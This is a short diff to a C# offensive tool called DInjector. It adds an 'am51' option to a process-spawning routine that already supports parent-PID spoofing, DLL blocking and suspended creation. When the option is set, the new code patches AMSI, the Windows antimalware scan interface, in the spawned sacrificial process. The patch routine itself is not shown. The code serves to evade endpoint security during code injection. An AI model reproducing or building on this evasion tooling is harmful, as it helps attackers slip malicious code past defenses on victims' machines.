@@ -15,7 +15,7 @@ namespace DInjector
     {
         public static bool Is64Bit => IntPtr.Size == 8;
 
-        public static DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION Execute(string processImage, string workingDirectory, bool suspended, int ppid, bool blockDlls)
+        public static DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION Execute(string processImage, string workingDirectory, bool suspended, int ppid, bool blockDlls, bool am51)
         {
             var startupInfoEx = new DI.Data.Win32.ProcessThreadsAPI._STARTUPINFOEX();
             startupInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(startupInfoEx);
@@ -102,6 +102,12 @@ namespace DInjector
 
             _ = Win32.DeleteProcThreadAttributeList(startupInfoEx.lpAttributeList);
             Marshal.FreeHGlobal(lpValue);
+
+            if (am51)
+                // When patching AMSI in a sacrifical process in a suspended state, "force" option is always TRUE as we can't enumerate its loaded modules properly
+                AM51.Patch(
+                    processHandle: pi.hProcess,
+                    processID: (int)pi.dwProcessId);
 
             return pi;
         }
